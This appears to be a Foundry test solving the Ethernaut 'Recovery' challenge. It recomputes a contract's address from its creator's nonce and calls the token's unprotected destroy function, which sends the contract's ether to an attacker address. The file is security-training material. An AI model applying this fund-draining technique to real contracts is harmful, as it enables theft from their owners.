// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/Recovery.sol";

library Address {
    function computeAddress(address _sender, uint _nonce) external pure returns (address _address) {
		bytes memory data;
		if(_nonce == 0x00) {
			data = abi.encodePacked(
				bytes1(0xd6), bytes1(0x94), _sender, bytes1(0x80)
			);
		}
		else if(_nonce <= 0x7f) {
			data = abi.encodePacked(
				bytes1(0xd6), bytes1(0x94), _sender, uint8(_nonce)
			);
		}
		else if(_nonce <= 0xff) {
			data = abi.encodePacked(
				bytes1(0xd7), bytes1(0x94), _sender, bytes1(0x81), uint8(_nonce)
			);
		}
		else if(_nonce <= 0xffff) {
			data = abi.encodePacked(
				bytes1(0xd8), bytes1(0x94), _sender, bytes1(0x82), uint16(_nonce)
			);
		}
		else if(_nonce <= 0xffffff) {
			data = abi.encodePacked(
				bytes1(0xd9), bytes1(0x94), _sender, bytes1(0x83), uint24(_nonce)
			);
		}
		else {
			data = abi.encodePacked(
				bytes1(0xda), bytes1(0x94), _sender, bytes1(0x84), uint32(_nonce)
			);
		}

		return address(uint160(uint256(keccak256(data))));
	}
}


contract TestRecovery is Test {
    Recovery recovery;
    address player = address(0x51);
	address attacker = address(0x52);

    function setUp() external {
        recovery = new Recovery();
        vm.deal(player, 1 ether);
        vm.startPrank(player);
        recovery.generateToken("token", 10000 ether);
		address token = Address.computeAddress(
			address(recovery), vm.getNonce(address(recovery)) - 1
		);
		(bool res, ) = payable(token).call{value: 0.001 ether}("");
		require(res);
		vm.stopPrank();
    }

    function testExploit() external {
		address token = Address.computeAddress(
			address(recovery), vm.getNonce(address(recovery)) - 1
		);
		SimpleToken simpleToken = SimpleToken(payable(token));
		assertEq(simpleToken.balances(player), 0.001 ether * 10);
		assertEq(token.balance, 0.001 ether);
		assertEq(attacker.balance, 0 ether);
		simpleToken.destroy(payable(attacker));
		assertEq(attacker.balance, 0.001 ether);
    }
}
